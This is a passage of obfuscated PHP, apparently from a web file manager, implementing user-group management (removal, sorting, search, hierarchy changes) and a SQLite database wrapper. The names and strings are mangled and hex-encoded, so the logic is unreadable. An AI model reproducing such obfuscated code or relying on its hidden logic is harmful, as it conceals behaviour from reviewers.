$this->parentLevelArray($­¢üû¯Ò[$ªËÒ¦–á[597]]); } else { } $ŞµÚÙƒğ[] = $­¢üû¯Ò[$ªËÒ¦–á[1420]]; $¼ØŠÇô = array(); foreach ($ŞµÚÙƒğ as $‰øÊ±ı) { $¼ØŠÇô[] = array($ªËÒ¦–á[1420] => $‰øÊ±ı, $ªËÒ¦–á[97] => $ªËÒ¦–á[839], $ªËÒ¦–á[452] => $›×ãº¦õ); $this->_clearCache($‰øÊ±ı); } return Model($ªËÒ¦–á[2103])->addAll($¼ØŠÇô, array(), !0); } protected function groupRemove($¨ƒô¹³ü, $Š÷Íè°Î = false) { $ÌÓœºèâ =& $_SERVER[Î·Ü›öğ]; $ï²Ä¯ôë = array($ÌÓœºèâ[1420] => $¨ƒô¹³ü); $ÌèùŒÈ = $this->where($ï²Ä¯ôë)->find(); if (!$ÌèùŒÈ || $ÌèùŒÈ[$ÌÓœºèâ[193]] == 0) { return !1; } if (!$Š÷Íè°Î) { $Â±°æâô = $this->getInfoSimple($ÌèùŒÈ[$ÌÓœºèâ[193]]); $this->_changeChildLevel($ÌèùŒÈ, $Â±°æâô, !0); $this->where(array($ÌÓœºèâ[193] => $¨ƒô¹³ü))->save(array($ÌÓœºèâ[193] => $ÌèùŒÈ[$ÌÓœºèâ[193]])); $this->_clearCache($Â±°æâô[$ÌÓœºèâ[1420]]); } Model($ÌÓœºèâ[2103])->where($ï²Ä¯ôë)->delete(); Model($ÌÓœºèâ[2104])->where($ï²Ä¯ôë)->delete(); Model($ÌÓœºèâ[922])->groupRootRemove($¨ƒô¹³ü); $this->_clearCache($ÌèùŒÈ[$ÌÓœºèâ[193]]); return $this->where($ï²Ä¯ôë)->delete(); } protected function groupSort($Ò¿ñ ¿¸) { $Ùøğí =& $_SERVER[Î·Ü›öğ]; $ÙÆşÃÆü = array(); foreach ($Ò¿ñ ¿¸ as $ïÂğúë => $–æŞ¹˜) { $ÙÆşÃÆü[] = array($Ùøğí[1420], $–æŞ¹˜, $Ùøğí[2034], $ïÂğúë + 1); } $this->saveAll($ÙÆşÃÆü); } public function listData() { $ÂùÁ¡Ö† = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÂùÁ¡Ö†[$_SERVER[Î·Ü›öğ][447]]); return $ÂùÁ¡Ö†; } private function _makeOrder($ï‘ú·Øæ = '') { $Œú’¾­ =& $_SERVER[Î·Ü›öğ]; $”Ä±˜˜ = array($Œú’¾­[1420], $Œú’¾­[32], $Œú’¾­[1999], $Œú’¾­[234]); $ëÔÂã€æ = array($Œú’¾­[534] => $Œú’¾­[535], $Œú’¾­[536] => $Œú’¾­[537]); $åºö¾ßû = Input::get($Œú’¾­[541], $Œú’¾­[7], $Œú’¾­[2014], $”Ä±˜˜); $¢™ñµ = Input::get($Œú’¾­[542], $Œú’¾­[7], $Œú’¾­[2105], array($Œú’¾­[2105], $Œú’¾­[536])); $¢™ñµ = $ëÔÂã€æ[$¢™ñµ]; $ï‘ú·Øæ = $ï‘ú·Øæ . "{$åºö¾ßû}\40{$¢™ñµ}\54\x20\147\162\157\165\x70\111\x44\40\141\163\143"; return $this->order($ï‘ú·Øæ); } public function listChild($”œ˜ëØ) { $Ãõ‘ËÂ¬ =& $_SERVER[Î·Ü›öğ]; $úƒ¨Ø¾ = $this->where(array($Ãõ‘ËÂ¬[193] => $”œ˜ëØ))->_makeOrder()->selectPage(200); $this->_listDataApply($úƒ¨Ø¾[$Ãõ‘ËÂ¬[447]]); return $úƒ¨Ø¾; } public function listChildIds($Û§ÜÀÖ) { $úş «õ =& $_SERVER[Î·Ü›öğ]; if (is_string($Â¬–ï’³)) { $Û§ÜÀÖ = explode($úş «õ[50], $Û§ÜÀÖ); } $Œ‚š¡¶ = $this->where(array($úş «õ[1420] => array($úş «õ[7], $Û§ÜÀÖ)))->field($úş «õ[2106])->select(); if (!$Œ‚š¡¶) { return !1; } $ŸôÍ¾„ = array(); foreach ($Œ‚š¡¶ as $¤ˆï“µ) { $ŸôÍ¾„[] = "\x73\x65\x6c\x65\143\164\40\x67\x72\x6f\x75\160\111\x44\x20\146\x72\x6f\155\x20\x60\147\x72\157\x75\x70\x60\x20\x77\150\x65\x72\x65\40\160\141\162\145\x6e\x74\114\145\x76\145\x6c\x20\x6c\151\x6b\x65\x20\47{$¤ˆï“µ[$úş «õ[597]]}{$¤ˆï“µ[$úş «õ[1420]]}\54\x25\47"; } $ŸôÍ¾„ = implode($úş «õ[2107], $ŸôÍ¾„); $Œ‚š¡¶ = $this->query($ŸôÍ¾„); if (!$Œ‚š¡¶) { return array(); } $Û§ÜÀÖ = array_to_keyvalue($Œ‚š¡¶, $úş «õ[12], $úş «õ[1420]); return array_unique($Û§ÜÀÖ); } public function listByID($ÇÖˆ…€) { $õ†…¶˜ =& $_SERVER[Î·Ü›öğ]; if (!$ÇÖˆ…€) { return array(); } $…¨¬¦ÈÜ = array($õ†…¶˜[1420] => array($õ†…¶˜[7], $ÇÖˆ…€)); $ûìŞ¿ = $this->where($…¨¬¦ÈÜ)->select(); $ûìŞ¿ = array_sort_keep($ûìŞ¿, $õ†…¶˜[1420], $ÇÖˆ…€); $this->_listDataApply($ûìŞ¿); return $ûìŞ¿; } public function listSearch($¿ñ–­çò) { $ÈªŸ¿§ =& $_SERVER[Î·Ü›öğ]; $ä”Ö¯ÙÔ = trim($¿ñ–­çò[$ÈªŸ¿§[2108]]); $¡½İüÓ² = explode($ÈªŸ¿§[53], $ä”Ö¯ÙÔ); if (!$ä”Ö¯ÙÔ || count($¡½İüÓ²) == 1) { return $this->listSearchNow($¿ñ–­çò); } $âÁ±Ú²± = array($ÈªŸ¿§[447] => array()); foreach ($¡½İüÓ² as $Ã½ÚÎ™Ú) { if (!trim($Ã½ÚÎ™Ú)) { continue; } $¿ñ–­çò[$ÈªŸ¿§[2108]] = $Ã½ÚÎ™Ú; $Ó‚Ö¯Ìƒ = $this->listSearchNow($¿ñ–­çò); $âÁ±Ú²±[$ÈªŸ¿§[447]] = array_merge($âÁ±Ú²±[$ÈªŸ¿§[447]], $Ó‚Ö¯Ìƒ[$ÈªŸ¿§[447]]); } $âÁ±Ú²±[$ÈªŸ¿§[447]] = array_unique_by_key($âÁ±Ú²±[$ÈªŸ¿§[447]], $ÈªŸ¿§[1420]); $âÁ±Ú²±[$ÈªŸ¿§[444]] = array($ÈªŸ¿§[445] => count($âÁ±Ú²±[$ÈªŸ¿§[447]]), $ÈªŸ¿§[441] => 20, $ÈªŸ¿§[430] => 1, $ÈªŸ¿§[446] => 1); return $âÁ±Ú²±; } public function listSearchNow($’ÉÙİ²ó) { $·—¶•è =& $_SERVER[Î·Ü›öğ]; $ÂÁ½Úµé = trim($’ÉÙİ²ó[$·—¶•è[2108]]); $“Æºâƒ = isset($’ÉÙİ²ó[$·—¶•è[2109]]) ? $’ÉÙİ²ó[$·—¶•è[2109]] : !1; if (!trim($ÂÁ½Úµé)) { return !1; } $ÂÁ½Úµé = str_replace($·—¶•è[2110], $·—¶•è[2111], $ÂÁ½Úµé); $§×À‘´ = array($·—¶•è[1420] => array($·—¶•è[461], "{$ÂÁ½Úµé}\x25"), $·—¶•è[32] => array($·—¶•è[461], "\x25{$ÂÁ½Úµé}\x25"), $·—¶•è[1099] => $·—¶•è[2112]); if ($“Æºâƒ) { $÷ó½—µ¢ = $this->getInfoSimple($“Æºâƒ); $¦Õ¤·‡ = $÷ó½—µ¢[$·—¶•è[597]] . $“Æºâƒ . $·—¶•è[629]; $§×À‘´ = array($§×À‘´, array($·—¶•è[597] => array($·—¶•è[461], $¦Õ¤·‡))); } $§×À‘´ = $this->parseWhereLike($§×À‘´); $É–ˆ¾Âï = $this->_makeOrder()->where($§×À‘´)->selectPage(20); $É–ˆ¾Âï = $É–ˆ¾Âï ? $É–ˆ¾Âï : array($·—¶•è[447] => array(), $·—¶•è[444] => array()); if (!$É–ˆ¾Âï || count($É–ˆ¾Âï[$·—¶•è[447]]) < 5 && Input::check($ÂÁ½Úµé, $·—¶•è[395])) { $··¢…¬¦ = $this->groupChildrenAll($“Æºâƒ); $»Õ”‰· = $this->_searchFromMeta($·—¶•è[548], $ÂÁ½Úµé, 10, $··¢…¬¦); $èÓ—ÀïÖ = $this->_searchFromMeta($·—¶•è[549], $ÂÁ½Úµé, 10, $··¢…¬¦); $à•›úÌÌ = array_merge($»Õ”‰·, $èÓ—ÀïÖ, $É–ˆ¾Âï[$·—¶•è[447]]); $É–ˆ¾Âï[$·—¶•è[447]] = array_unique_by_key($à•›úÌÌ, $·—¶•è[1420]); $É–ˆ¾Âï[$·—¶•è[444]][$·—¶•è[445]] = count($É–ˆ¾Âï[$·—¶•è[447]]); $É–ˆ¾Âï[$·—¶•è[444]][$·—¶•è[446]] = ceil($É–ˆ¾Âï[$·—¶•è[444]][$·—¶•è[445]] / $É–ˆ¾Âï[$·—¶•è[444]][$·—¶•è[441]]); } $this->_listDataApply($É–ˆ¾Âï[$·—¶•è[447]]); return $É–ˆ¾Âï; } protected function groupChildrenAll($œÅèÊáö) { $¡Æ–Ÿ‡ñ =& $_SERVER[Î·Ü›öğ]; if (!$œÅèÊáö) { return !1; } if (!is_array($œÅèÊáö)) { $œÅèÊáö = array($œÅèÊáö); } $Ûë´³î¡ = $œÅèÊáö; foreach ($œÅèÊáö as $²¸ÛÕ¶É) { $åğ£š°ª = $this->getInfoSimple($²¸ÛÕ¶É); $¿²öôÈá = array($¡Æ–Ÿ‡ñ[597] => array($¡Æ–Ÿ‡ñ[461], $åğ£š°ª[$¡Æ–Ÿ‡ñ[597]] . $²¸ÛÕ¶É . $¡Æ–Ÿ‡ñ[629])); $›‡Ö„¼« = $this->field($¡Æ–Ÿ‡ñ[1420])->where($¿²öôÈá)->select(); $Ûë´³î¡ = array_merge($Ûë´³î¡, array_to_keyvalue($›‡Ö„¼«, $¡Æ–Ÿ‡ñ[12], $¡Æ–Ÿ‡ñ[1420])); } return array_unique($Ûë´³î¡); } private function _searchFromMeta($ê±åä¡‡, $óÇÔÊ °, $ õ–µ…, $ıÓåÃÒŸ) { $Šƒ»ûİ˜ =& $_SERVER[Î·Ü›öğ]; $óÇÔÊ ° = strtolower($óÇÔÊ °); $”¤œš  = array($Šƒ»ûİ˜[97] => $ê±åä¡‡, $Šƒ»ûİ˜[452] => array($Šƒ»ûİ˜[461], "\x25{$óÇÔÊ °}\x25")); $”¤œš  = $this->parseWhereLike($”¤œš ); if ($ıÓåÃÒŸ) { $”¤œš [$Šƒ»ûİ˜[1420]] = array($Šƒ»ûİ˜[7], $ıÓåÃÒŸ); } $ÛÈ°¥Œ¹ = Model($Šƒ»ûİ˜[2113])->where($”¤œš )->limit($ õ–µ…)->select(); if (!$ÛÈ°¥Œ¹) { return array(); } $ÛÈ°¥Œ¹ = array_to_keyvalue($ÛÈ°¥Œ¹, $Šƒ»ûİ˜[12], $Šƒ»ûİ˜[1420]); $ÄØìÂÂ… = $this->where(array($Šƒ»ûİ˜[2099] => array($Šƒ»ûİ˜[7], $ÛÈ°¥Œ¹)))->select(); if (!$ÄØìÂÂ…) { return array(); } return $ÄØìÂÂ…; } protected function _listDataApplyItem($Çï”èá€) { $±´–Ş¾É = array($Çï”èá€); $this->_listDataApply($±´–Ş¾É); return $±´–Ş¾É[0]; } protected function _listDataApply(&$­Ã¤•â¿) { $“ÚªÓïÊ =& $_SERVER[Î·Ü›öğ]; if (!$­Ã¤•â¿) { return; } $Ù«¥Ìº— = array_to_keyvalue($­Ã¤•â¿, $“ÚªÓïÊ[12], $“ÚªÓïÊ[1420]); $this->_listAppendChildren($­Ã¤•â¿); $this->_listAppendChildrenMember($­Ã¤•â¿); $this->_listAppendMeta($­Ã¤•â¿, $Ù«¥Ìº—); $this->_listAppendParent($­Ã¤•â¿); $this->_listAppendSourceRoot($­Ã¤•â¿, $Ù«¥Ìº—); } private function _listAppendChildren(&$™´Î³ˆ×) { $¸ÇÂ§¢ğ =& $_SERVER[Î·Ü›öğ]; $¦©€—Ü› = array_to_keyvalue($™´Î³ˆ×, $¸ÇÂ§¢ğ[12], $¸ÇÂ§¢ğ[1420]); $Ş©ë±“ = array($¸ÇÂ§¢ğ[193] => array($¸ÇÂ§¢ğ[7], $¦©€—Ü›)); $–Á×Ä = array($¸ÇÂ§¢ğ[193], $¸ÇÂ§¢ğ[2114] => $¸ÇÂ§¢ğ[578]); $¯Ã¶ù§ = $this->field($–Á×Ä)->where($Ş©ë±“)->group($¸ÇÂ§¢ğ[193])->select(); $ÚıüÕ†ö = array_to_keyvalue($¯Ã¶ù§, $¸ÇÂ§¢ğ[193], $¸ÇÂ§¢ğ[578]); foreach ($™´Î³ˆ× as &$·•Ğû³à) { $¥”ĞïÄÑ = $·•Ğû³à[$¸ÇÂ§¢ğ[1420]]; $·•Ğû³à[$¸ÇÂ§¢ğ[2115]] = isset($ÚıüÕ†ö[$¥”ĞïÄÑ]) ? intval($ÚıüÕ†ö[$¥”ĞïÄÑ]) : !1; } unset($·•Ğû³à); } private function _listAppendChildrenMember(&$Ö˜ÉÂ¯¹) { $ÖŸô£êÔ =& $_SERVER[Î·Ü›öğ]; $Ë…„üñ = array_to_keyvalue($Ö˜ÉÂ¯¹, $ÖŸô£êÔ[12], $ÖŸô£êÔ[1420]); $©»Á–ı = array($ÖŸô£êÔ[1420] => array($ÖŸô£êÔ[7], $Ë…„üñ)); $íôğğ÷í = array($ÖŸô£êÔ[1420], $ÖŸô£êÔ[2114] => $ÖŸô£êÔ[578]); $üÜÙİòè = Model($ÖŸô£êÔ[2104])->field($íôğğ÷í)->where($©»Á–ı)->group($ÖŸô£êÔ[1420])->select(); $¹¡ˆå›Î = array_to_keyvalue($üÜÙİòè, $ÖŸô£êÔ[1420], $ÖŸô£êÔ[578]); foreach ($Ö˜ÉÂ¯¹ as &$‘¾£É¬) { $ÔÀÁ×ó = $‘¾£É¬[$ÖŸô£êÔ[1420]]; $‘¾£É¬[$ÖŸô£êÔ[2116]] = isset($¹¡ˆå›Î[$ÔÀÁ×ó]) ? intval($¹¡ˆå›Î[$ÔÀÁ×ó]) : !1; } unset($‘¾£É¬); } private function _listAppendMeta(&$é™²Â·¦, $ƒúËŞÅ—) { $ÏÉ‡ùñü =& $_SERVER[Î·Ü›öğ]; $ƒÀ£ÌĞ  = array($ÏÉ‡ùñü[1420] => array($ÏÉ‡ùñü[7], $ƒúËŞÅ—)); $¦÷Á°µğ = Model($ÏÉ‡ùñü[2103])->where($ƒÀ£ÌĞ )->select(); $¦÷Á°µğ = array_to_keyvalue_group($¦÷Á°µğ, $ÏÉ‡ùñü[1420]); foreach ($¦÷Á°µğ as &$õÚï® ) { $õÚï®  = array_to_keyvalue($õÚï® , $ÏÉ‡ùñü[97], $ÏÉ‡ùñü[452]); } unset($õÚï® ); foreach ($é™²Â·¦ as &$’ó†Î´ó) { $’ó†Î´ó[$ÏÉ‡ùñü[552]] = array(); if (isset($¦÷Á°µğ[$’ó†Î´ó[$ÏÉ‡ùñü[1420]]])) { $’ó†Î´ó[$ÏÉ‡ùñü[552]] = $¦÷Á°µğ[$’ó†Î´ó[$ÏÉ‡ùñü[1420]]]; } } unset($’ó†Î´ó); } protected function parentLevelArray($Ş²ôÚßÊ) { $ñÒ°úî =& $_SERVER[Î·Ü›öğ]; $Ş²ôÚßÊ = explode($ñÒ°úî[50], trim($Ş²ôÚßÊ, $ñÒ°úî[50])); $Ş²ôÚßÊ = array_remove_value($Ş²ôÚßÊ, $ñÒ°úî[231]); return $Ş²ôÚßÊ; } protected function parentInGroup($•È³øƒØ, $ÉÌôò¡ğ) { $©§ ¿Å± =& $_SERVER[Î·Ü›öğ]; $¡ëŸ™¹ª = $this->getInfoSimple($•È³øƒØ); if (!$¡ëŸ™¹ª) { return !0; } $ ×Âæ¯ = $this->parentLevelArray($¡ëŸ™¹ª[$©§ ¿Å±[597]]); $ ×Âæ¯[] = $•È³øƒØ; foreach ($ ×Âæ¯ as $•È³øƒØ) { if (in_array($•È³øƒØ . $©§ ¿Å±[12], $ÉÌôò¡ğ)) { return !0; } } return !1; } private function _listAppendParent(&$ÚÖ×©ÊÛ) { $ÕªšäÅ =& $_SERVER[Î·Ü›öğ]; $ª°³¢‰ = array(); foreach ($ÚÖ×©ÊÛ as &$‹È¿ü·¾) { $ª°³¢‰[$‹È¿ü·¾[$ÕªšäÅ[1420]]] = $‹È¿ü·¾[$ÕªšäÅ[32]]; $½¯ÎŞš¸ = $this->parentLevelArray($‹È¿ü·¾[$ÕªšäÅ[597]]); foreach ($½¯ÎŞš¸ as $±‘Ú‰·æ) { if (!isset($ª°³¢‰[$±‘Ú‰·æ])) { $ª°³¢‰[$±‘Ú‰·æ] = 0; } } } unset($‹È¿ü·¾); foreach ($ª°³¢‰ as $³Œå‰í => $ÉöæïÌ±) { if ($ÉöæïÌ±) { continue; } $±Œ¿¼£é = $this->getInfoSimple($³Œå‰í); $ª°³¢‰[$³Œå‰í] = $±Œ¿¼£é[$ÕªšäÅ[32]]; } $œÏšÛ£ = $GLOBALS[$ÕªšäÅ[6]][$ÕªšäÅ[92]][$ÕªšäÅ[2117]]; if (KodUser::isRoot()) { $œÏšÛ£ = !1; } foreach ($ÚÖ×©ÊÛ as &$‹È¿ü·¾) { $½¯ÎŞš¸ = $this->parentLevelArray($‹È¿ü·¾[$ÕªšäÅ[597]]); $ÜÚ¯æ˜ = $ÕªšäÅ[12]; foreach ($½¯ÎŞš¸ as $³Œå‰í => $±‘Ú‰·æ) { if ($œÏšÛ£ && $³Œå‰í == 0) { continue; } $ÜÚ¯æ˜ .= $ª°³¢‰[$±‘Ú‰·æ] . $ÕªšäÅ[8]; } if ($½¯ÎŞš¸) { $ÜÚ¯æ˜ .= $‹È¿ü·¾[$ÕªšäÅ[32]]; } $‹È¿ü·¾[$ÕªšäÅ[602]] = str_replace($ÕªšäÅ[257], $ÕªšäÅ[8], $ÜÚ¯æ˜); } unset($‹È¿ü·¾); } private function _listAppendSourceRoot(&$µ¹ÈµöÓ, $Ñş×ºî‰) { $Œ—¿¹›ª =& $_SERVER[Î·Ü›öğ]; $³‚í‘Ãé = Model($Œ—¿¹›ª[922])->listSourceRoot(SourceModel::TYPE_GROUP, $Ñş×ºî‰); $³‚í‘Ãé = array_to_keyvalue($³‚í‘Ãé, $Œ—¿¹›ª[582]); $³‚í‘Ãé = array_remove_key($³‚í‘Ãé, $Œ—¿¹›ª[582]); foreach ($µ¹ÈµöÓ as &$˜¤ŠÙ¦·) { $˜¤ŠÙ¦·[$Œ—¿¹›ª[90]] = $³‚í‘Ãé[$˜¤ŠÙ¦·[$Œ—¿¹›ª[1420]]] ? $³‚í‘Ãé[$˜¤ŠÙ¦·[$Œ—¿¹›ª[1420]]] : array(); } unset($˜¤ŠÙ¦·); } protected function groupMerge($²¶Ë ÇÌ) { $²¶Ë ÇÌ = array_values(array_unique($²¶Ë ÇÌ)); $«À««¡² = array(); for ($é—ıŒ„ = 0; $é—ıŒ„ < count($²¶Ë ÇÌ); $é—ıŒ„++) { $ÎîµàÒ = !1; for ($Ñ İª×  = 0; $Ñ İª×  < count($²¶Ë ÇÌ); $Ñ İª× ++) { if ($é—ıŒ„ == $Ñ İª× ) { continue; } if ($this->isParentOf($²¶Ë ÇÌ[$Ñ İª× ], $²¶Ë ÇÌ[$é—ıŒ„])) { $ÎîµàÒ = !0; break; } } if (!$ÎîµàÒ) { $«À««¡²[] = $²¶Ë ÇÌ[$é—ıŒ„]; } } return $«À««¡²; } protected function isParentOf($ş¸£ïäâ, $†¦˜ìå) { $ÌèéÂ¼Ô =& $_SERVER[Î·Ü›öğ]; if (!$ş¸£ïäâ || !$†¦˜ìå || $ş¸£ïäâ == $†¦˜ìå) { return !1; } $×éœà°¤ = $this->getInfoSimple($ş¸£ïäâ); $çüŞûÆ = $this->getInfoSimple($†¦˜ìå); $èÕâ÷¶« = $×éœà°¤[$ÌèéÂ¼Ô[597]] . $ş¸£ïäâ . $ÌèéÂ¼Ô[50]; if (substr($çüŞûÆ[$ÌèéÂ¼Ô[597]], 0, strlen($èÕâ÷¶«)) == $èÕâ÷¶«) { return !0; } return !1; } public function groupShowRoot($Öİ×±¾ö, $ÙÀºÛœ = false) { $Ï‚ñÆÃ‰ =& $_SERVER[Î·Ü›öğ]; $øñÆº¨Ş = $this->getInfo($Öİ×±¾ö); if (!$øñÆº¨Ş) { return array(); } $ÅÇ„íÛ“ = $this->parentLevelArray($øñÆº¨Ş[$Ï‚ñÆÃ‰[597]]); $ó†ìÇ¸æ = array($Öİ×±¾ö); if (count($ÅÇ„íÛ“) == 0) { return $ó†ìÇ¸æ; } if ($ÙÀºÛœ && count($ÅÇ„íÛ“) == 1) { return $ó†ìÇ¸æ; } if (!$øñÆº¨Ş[$Ï‚ñÆÃ‰[552]] || !isset($øñÆº¨Ş[$Ï‚ñÆÃ‰[552]][$Ï‚ñÆÃ‰[2100]]) || $øñÆº¨Ş[$Ï‚ñÆÃ‰[552]][$Ï‚ñÆÃ‰[2100]] == $Ï‚ñÆÃ‰[868]) { return $this->groupShowRoot($ÅÇ„íÛ“[count($ÅÇ„íÛ“) - 1], $ÙÀºÛœ); } if ($øñÆº¨Ş[$Ï‚ñÆÃ‰[552]][$Ï‚ñÆÃ‰[2100]] == $Ï‚ñÆÃ‰[434]) { $şĞ‚ëÁ† = explode($Ï‚ñÆÃ‰[50], $øñÆº¨Ş[$Ï‚ñÆÃ‰[552]][$Ï‚ñÆÃ‰[2101]]); if ($şĞ‚ëÁ†) { $ó†ìÇ¸æ = array_merge($ó†ìÇ¸æ, $şĞ‚ëÁ†); } } return $ó†ìÇ¸æ; } protected function resetParentLevel() { $–ÅŠö‰— =& $_SERVER[Î·Ü›öğ]; $èŸíùÌ… = $–ÅŠö‰—[1420]; $ƒ÷›ìÊÉ = $this->select(); $ƒ÷›ìÊÉ = array_to_keyvalue($ƒ÷›ìÊÉ, $èŸíùÌ…); foreach ($ƒ÷›ìÊÉ as $öİÒâø¯) { $Ó„‹–„« = $öİÒâø¯; $Şë—ÖŠœ = array(); while ($Ó„‹–„«[$–ÅŠö‰—[193]] != 0) { $Şë—ÖŠœ[] = $Ó„‹–„«[$–ÅŠö‰—[193]]; $Ó„‹–„« = $ƒ÷›ìÊÉ[$Ó„‹–„«[$–ÅŠö‰—[193]]]; } $Şë—ÖŠœ[] = 0; $Şë—ÖŠœ = $–ÅŠö‰—[50] . implode($–ÅŠö‰—[50], array_reverse($Şë—ÖŠœ)) . $–ÅŠö‰—[50]; $this->setNamePinyin($öİÒâø¯[$èŸíùÌ…], $öİÒâø¯[$–ÅŠö‰—[32]]); $this->where(array($èŸíùÌ… => $öİÒâø¯[$èŸíùÌ…]))->save(array($–ÅŠö‰—[668] => $Şë—ÖŠœ)); } return $ƒ÷›ìÊÉ; } public function groupNameAuto($–ÛÙôš·, $¨£şßú¾) { $æ³½İà =& $_SERVER[Î·Ü›öğ]; $â«®õ”ï = $this->where(array($æ³½İà[488] => $–ÛÙôš·))->getField($æ³½İà[32], !0); if (!$â«®õ”ï || !in_array($¨£şßú¾, $â«®õ”ï)) { return $¨£şßú¾; } for ($ÃÄÔÇİ§ = 1; $ÃÄÔÇİ§ <= count($â«®õ”ï) + 1; $ÃÄÔÇİ§++) { $‹­Ÿ—‰Ô = $¨£şßú¾ . "\50{$ÃÄÔÇİ§}\x29"; if (!in_array($‹­Ÿ—‰Ô, $â«®õ”ï)) { return $‹­Ÿ—‰Ô; } } } public function groupSwitch($ğ•±Ş¦ß, $ã°…¸’) { $ô¥¸ü‹¬ =& $_SERVER[Î·Ü›öğ]; $ããÓ¡‹‹ = array($ô¥¸ü‹¬[1420] => array($ô¥¸ü‹¬[7], array($ğ•±Ş¦ß, $ã°…¸’))); $òıø£º˜ = $this->where($ããÓ¡‹‹)->select(); $òıø£º˜ = array_to_keyvalue($òıø£º˜, $ô¥¸ü‹¬[1420]); if (!isset($òıø£º˜[$ğ•±Ş¦ß]) || !isset($òıø£º˜[$ã°…¸’]) || $òıø£º˜[$ğ•±Ş¦ß][$ô¥¸ü‹¬[193]] == 0) { return !1; } $ããÓ¡‹‹ = array($ô¥¸ü‹¬[1420] => $ğ•±Ş¦ß); $“ÛÖ¹áé = Model($ô¥¸ü‹¬[2104])->where($ããÓ¡‹‹)->select(); if (!$“ÛÖ¹áé) { $“ÛÖ¹áé = array(); } foreach ($“ÛÖ¹áé as $Åïê‹Œ) { $—¥“æˆ = $Åïê‹Œ[$ô¥¸ü‹¬[1810]]; $ããÓ¡‹‹ = array($ô¥¸ü‹¬[1810] => $—¥“æˆ, $ô¥¸ü‹¬[1420] => $ã°…¸’); $©ãîõ‚  = Model($ô¥¸ü‹¬[2104])->where($ããÓ¡‹‹)->find(); if (!$©ãîõ‚ ) { $ŒÃô¥©¨ = array($ã°…¸’ => $Åïê‹Œ[$ô¥¸ü‹¬[2118]]); Model($ô¥¸ü‹¬[610])->userGroupAdd($—¥“æˆ, $ŒÃô¥©¨); } Model($ô¥¸ü‹¬[610])->userGroupRemove($—¥“æˆ, $ğ•±Ş¦ß); } $ããÓ¡‹‹ = array($ô¥¸ü‹¬[191] => 2, $ô¥¸ü‹¬[193] => 0, $ô¥¸ü‹¬[496] => 1, $ô¥¸ü‹¬[582] => array($ô¥¸ü‹¬[7], array($ğ•±Ş¦ß, $ã°…¸’))); $í¸ÓÊ¹° = Model($ô¥¸ü‹¬[922])->where($ããÓ¡‹‹)->field($ô¥¸ü‹¬[2119])->select(); $í¸ÓÊ¹° = array_to_keyvalue($í¸ÓÊ¹°, $ô¥¸ü‹¬[582], $ô¥¸ü‹¬[194]); $öÎ›¢‡ = !empty($í¸ÓÊ¹°[$ğ•±Ş¦ß]) ? $í¸ÓÊ¹°[$ğ•±Ş¦ß] : !1; if ($öÎ›¢‡) { if (!$í¸ÓÊ¹°[$ã°…¸’]) { $í¸ÓÊ¹°[$ã°…¸’] = Model($ô¥¸ü‹¬[922])->groupRootAdd($ã°…¸’); } $Ò‹ÎÊ†¥ = $í¸ÓÊ¹°[$ã°…¸’]; $ããÓ¡‹‹ = array($ô¥¸ü‹¬[193] => $öÎ›¢‡); $í¸ÓÊ¹° = Model($ô¥¸ü‹¬[922])->where($ããÓ¡‹‹)->field($ô¥¸ü‹¬[2120])->select(); if (!$í¸ÓÊ¹°) { $í¸ÓÊ¹° = array(); } Model($ô¥¸ü‹¬[922])->moveClearAuth = !1; foreach ($í¸ÓÊ¹° as $¡İÈÊã) { $åø¼šÂÛ = $¡İÈÊã[$ô¥¸ü‹¬[496]] == $ô¥¸ü‹¬[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ô¥¸ü‹¬[922])->move($¡İÈÊã[$ô¥¸ü‹¬[194]], $Ò‹ÎÊ†¥, $åø¼šÂÛ); } Model($ô¥¸ü‹¬[922])->moveClearAuth = !0; $ããÓ¡‹‹ = array($ô¥¸ü‹¬[191] => 2, $ô¥¸ü‹¬[582] => $ğ•±Ş¦ß); $¶îÎ›Ç = array($ô¥¸ü‹¬[582] => $ã°…¸’); Model($ô¥¸ü‹¬[2121])->where($ããÓ¡‹‹)->save($¶îÎ›Ç); Model($ô¥¸ü‹¬[2122])->where($ããÓ¡‹‹)->save($¶îÎ›Ç); } $this->_changeChildLevel($òıø£º˜[$ğ•±Ş¦ß], $òıø£º˜[$ã°…¸’], !0); $this->where(array($ô¥¸ü‹¬[193] => $ğ•±Ş¦ß))->save(array($ô¥¸ü‹¬[193] => $ã°…¸’)); $this->_clearChildrenCache($òıø£º˜[$ã°…¸’]); return !0; } } goto e‘°É«âÈ; càøÕ‹ºÑä: class DbSqlite3 extends DbSqlite3Base { public function query($Ø©ÚÑ‰Î) { $úŞÒÖÊ¾ =& $_SERVER[Î·Ü›öğ]; if (!CacheLock::fileLock($úŞÒÖÊ¾[13])) { return !1; } $æØ´¾æ = parent::query($Ø©ÚÑ‰Î); CacheLock::fileUnLock($úŞÒÖÊ¾[13]); return $æØ´¾æ; } public function execute($ê½Ø­ßÚ) { $š¯£ºº– =& $_SERVER[Î·Ü›öğ]; if (!CacheLock::fileLock($š¯£ºº–[13])) { return !1; } $ªêÇ’ñ˜ = parent::execute($ê½Ø­ßÚ); CacheLock::fileUnLock($š¯£ºº–[13]); return $ªêÇ’ñ˜; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\145\161" => "\74\x3e", "\147\x74" => "\x3e", "\145\147\164" => "\x3e\x3d", "\x6c\164" => "\x3c", "\x65\x6c\x74" => "\74\x3d", "\156\157\164\154\151\x6b\145" => "\116\x4f\x54\x20\x4c\111\113\105", "\154\151\153\x65" => "\x4c\x49\x4b\x45", "\x69\x6e" => "\x49\116", "\x6e\x6f\164\x69\x6e" => "\x4e\x4f\124\40\111\116", "\156\157\164\40\151\x6e" => "\x4e\x4f\x54\x20\x49\x4e", "\142\145\164\x77\x65\x65\156" => "\102\105\x54\x57\x45\x45\x4e", "\x6e\157\x74\142\x65\x74\x77\x65\x65\156" => "\116\117\124\40\102\105\x54\127\105\x45\x4e", "\x6e\157\x74\40\142\x65\164\x77\x65\x65\x6e" => "\116\117\x54\40\102\x45\x54\x57\105\x45\x4e"); protected $selectSql = 